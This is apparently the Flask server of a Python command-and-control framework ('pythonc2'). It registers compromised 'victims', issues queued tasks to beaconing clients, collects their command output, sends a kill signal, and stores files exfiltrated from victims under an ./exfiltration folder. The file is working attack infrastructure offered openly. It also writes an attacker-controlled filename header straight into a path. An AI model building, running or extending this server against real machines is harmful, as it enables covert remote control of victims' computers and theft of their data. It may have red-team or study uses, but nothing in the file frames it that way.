from flask import Flask,request
from pathlib import Path
from lib.database import Database
from lib.module import Module
from lib.task import Task
from lib.victim import Victim
import  os
import pymongo
import logging
import pdb
import base64
from lib.logger import Logger
from termcolor import colored
import pdb
import time


def main(db_object,server_logger):
	app = Flask('app')

	## Get the cookie/victim ID from a request
	def get_cookie(request):
		d = request.cookies
		if d:
			return base64.b64decode(d.to_dict()['session']).decode()
		else:
			return False


	def get_victim_info(request):
		return request.form.to_dict()


	## Insert the command output in the Database
	def insert_cmd_output(output,victim_id,task_id):
		mydb = myclient["pythonc2"]
		cmds = mydb["commands"]
		h = {'victim_id':victim_id,'task_id':task_id}
		cmds.find_one_and_update(h,{ "$set": { "output": output } })



	####################################### General beacon and sends task  ####################################

	@app.route('/',methods = ['GET', 'POST'])
	def run():
		myclient = db_object.mongoclient
		if request.method == 'GET':
			mydb = myclient["pythonc2"]
			cmds = mydb["commands"]
			
			victim_id = get_cookie(request)

			## Update last seen
			if victim_id:
				if victim_id in Victim.victims.keys():
					victim_obj = Victim.victims[victim_id]
					victim_obj.update_last_seen_status_to_db()
					server_logger.info_log(f"Updated last seen of {victim_obj.victim_id}")

			task = Task.find_unissued_task(victim_id)

			## If there is any task
			if task:
				if task['command'] == 'kill':

					## Kill the victim by sending 'Die' and also update db
					Victim.victims[victim_id].status = 'Dead'
					Victim.victims[victim_id].update_last_seen_status_to_db()
					return 'Die'
				else:
					task_obj = Task.load_task(task)
					task_dict = task_obj.issue_dict()
					server_logger.info_log(f"Task issued, task id - {colored(task_dict['task_id'],'cyan')}",'green')
					server_logger.info_log(f"Task info - {task_dict}",'green')
					return task_dict

			## Default reply of server incase no commands
			return 'Nothing Fishy going on here :)'

		## Not needed remove.
		if request.method == 'POST':

			print("Command to exfiltrate recieved...")
			if not os.path.exists('./exfiltration'):
				os.mkdir('./exfiltration')
			## wb enables to write bianry
			with open('./exfiltration/'+request.headers['Filename'], "wb") as f:
				# Write bytes to file
				f.write(request.data)
			f.close()
			return "OK"

	####################################### Task output handler  ####################################

	@app.route('/<cmd>/output/<task_id>',methods = ['POST'])


	def task_output(cmd,task_id):
		if request.method == 'POST':
			victim_id = get_cookie(request)

			
			## Handling for various kind of tasks, also passing the task/module options set by user
			output = Module.module_task_id[task_id].handle_task_output(request.data,Task.tasks[task_id].options,victim_id,)

			server_logger.info_log(f"Recieved task output for task ID - {task_id} , Victim ID - {victim_id} , Command - {cmd}, Output - {colored(output,'cyan')}",'green')

			
			task_obj = Task.tasks[task_id]
			task_obj.insert_cmd_output(output)

			return "OK"

		
	####################################### Staging / Initial request from the victim  ####################################

	@app.route('/stage_0',methods = ['POST'])
	def stage():
		if request.method == 'POST':
			myclient = db_object.mongoclient

			mydb = myclient["pythonc2"]
			cmds = mydb["commands"]
			victims = mydb['victims']


			## Get the victim id of the new victim
			victim_id = get_cookie(request)

			## Get the other info about the victim
			info = get_victim_info(request)
			

			if victim_id:
				## instantiate a new victim object
				victim_obj = Victim(victim_id = victim_id,platform = info['platform'],os_version = info['version'],admin = info['admin'])


				if victim_obj:
					server_logger.info_log(f"New victim checked in - {victim_id} , {info['platform']}",'green')
					return ('Victim registered', 200)
				else:
					return ('Victim already registered', 302)

			return ('Bad request', 400)


	####################################### Client Error Recieved  ####################################

	@app.route('/clienterror',methods = ['POST'])
	def clienterror():
		if request.method == 'POST':
			server_logger.info_log(f"Recieved error from victim - {request.data.decode('utf-8')}",'yellow')

			return ('Error Recieved, we will get back to you', 200)

	app.run(host = '0.0.0.0', port = 8080)



if __name__=="__main__":
	
	server_logger = Logger(logdir='logs',logfile='logs',verbose=False )
	server_logger.setup()

	db_url = f"mongodb://{os.environ['MONGODB_USERNAME']}:{os.environ['MONGODB_PASSWORD']}@{os.environ['MONGODB_HOSTNAME']}:27017/{os.environ['MONGODB_DATABASE']}"

	db_object = Database(url=db_url)

	server_logger.info_log(f"Initiated database connection from main- {db_url}",'green')
	Victim.mongoclient = db_object.mongoclient
	Task.mongoclient = db_object.mongoclient
	main(db_object,server_logger)